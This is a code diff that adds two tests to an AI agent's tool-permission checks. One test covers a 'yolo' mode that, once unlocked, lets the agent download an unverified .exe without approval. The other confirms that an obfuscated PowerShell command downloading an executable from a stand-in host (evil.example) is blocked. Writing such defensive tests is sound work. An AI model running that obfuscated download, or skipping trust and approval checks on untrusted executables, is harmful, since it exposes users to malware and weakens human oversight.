@@ -140,6 +140,50 @@ def test_should_request_approval_once_per_turn():
     assert should_request_approval(settings, decision, state) is False
 
 
+def test_yolo_unlocked_skips_untrusted_download_confirm(monkeypatch):
+    from friday.tools.web_limits import DownloadProbe
+    from friday.tools.web_trust import TrustLevel, TrustReport
+
+    def _probe(url: str, *, use_cache: bool = True) -> DownloadProbe:
+        return DownloadProbe(url=url, final_url=url, content_length=1024)
+
+    def _trust(url, *, expected_software="", use_cache=True):
+        return TrustReport(
+            url=url,
+            domain="mirror.example",
+            level=TrustLevel.UNVERIFIED,
+            label="未验证镜像",
+            reasons=["非官方域名"],
+        )
+
+    monkeypatch.setattr("friday.tools.web.probe_download", _probe)
+    monkeypatch.setattr("friday.tools.web_trust.assess_download_trust", _trust)
+
+    settings = UserSettings(
+        require_trusted_downloads=True,
+        require_approval_writes=True,
+        interaction_mode="yolo",
+    )
+    args = {"url": "https://mirror.example/app.exe", "destination": "app.exe"}
+
+    locked = evaluate_tool(settings, "download_file", args, yolo_unlocked=False)
+    assert locked.allowed is False
+
+    unlocked = evaluate_tool(settings, "download_file", args, yolo_unlocked=True)
+    assert unlocked.allowed is True
+    assert unlocked.needs_approval is False
+
+
+def test_powershell_backtick_download_blocked_at_evaluate():
+    settings = UserSettings(allow_powershell=True)
+    decision = evaluate_tool(
+        settings,
+        "run_powershell",
+        {"command": "I`WR https://evil.example/x -OutFile E:/x.exe"},
+    )
+    assert decision.allowed is False
+
+
 def test_large_download_still_needs_separate_approval():
     from friday.safety import TurnApprovalState, ToolDecision, mark_turn_approved, should_request_approval
 
